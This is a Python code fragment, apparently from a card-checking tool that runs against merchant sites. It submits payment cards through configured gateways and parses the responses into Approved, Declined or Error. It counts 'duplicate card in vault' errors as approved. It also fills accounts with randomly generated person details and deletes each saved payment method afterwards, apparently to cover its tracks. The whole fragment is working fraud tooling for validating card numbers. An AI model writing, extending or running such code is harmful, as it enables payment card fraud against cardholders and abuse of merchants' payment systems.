            elif "data" in data and isinstance(data["data"], dict) and "error" in data["data"]:
                raw = data["data"]["error"].get("message", "Unknown error")
                error_message = raw.split("Error: ")[-1]

            return FAILED, error_message

        except (json.JSONDecodeError, ValueError):
            pass

        tree = html.fromstring(content)
        parsed = urlparse(gateway_config["url"])
        origin = f"{parsed.scheme}://{parsed.netloc}"

        success_xpath = gateway_config.get("success_message", "")
        if success_xpath:
            success_nodes = tree.xpath(success_xpath)
            if success_nodes:
                message = "Approved"
                if not _delete_payment_method(
                    request_id, card_info["number"], gateway_config, random_person,
                    f"{origin}/my-account/payment-methods/", session,
                ):
                    message = "Approved (error delete)"
                return APPROVED, message

        error_xpath = gateway_config.get("error_message", "")
        if error_xpath:
            error_nodes = tree.xpath(error_xpath)
            if error_nodes:
                raw_msg = error_nodes[0].strip()
                m = _RE_ERROR_MSG.search(raw_msg)
                extracted = m.group(1) if m else raw_msg

                if "Duplicate card exists in the vault" in extracted:
                    extracted = "Approved old try again"
                    if not _delete_payment_method(
                        request_id, card_info["number"], gateway_config, random_person,
                        f"{origin}/my-account/payment-methods/", session,
                    ):
                        extracted = "Approved old try again (error delete)"
                    return APPROVED, extracted

                return DECLINED, extracted

        logger.warning("No success or error message found in response")
        return ERROR, "No success or error message found in response"

    except Exception as exc:
        logger.error(f"Response parsing failed: {exc}")
        return ERROR, f"Parsing failed: {exc}"


def _delete_payment_method(
    request_id: str,
    card_number: str,
    gateway_config: Dict,
    random_person: Dict,
    url: str,
    session: requests.Session,
) -> bool:
    """Delete a saved payment method from the merchant account page."""
    try:
        resp = session.post(url=url, allow_redirects=True, timeout=15)
        resp.raise_for_status()
        session.cookies.update(resp.cookies)

        tree = html.fromstring(resp.content)
        delete_links = tree.xpath(
            '//a[contains(concat(" ", normalize-space(@class), " "), " delete ")]/@href'
        )
        if not delete_links:
            logger.warning("No delete link found on account page")
            return False

        del_resp = session.post(url=delete_links[0], allow_redirects=True, timeout=15)
        del_resp.raise_for_status()
        return "Payment method deleted" in del_resp.text
    except Exception as exc:
        logger.error(f"delete_payment_method failed: {exc}")
        return False
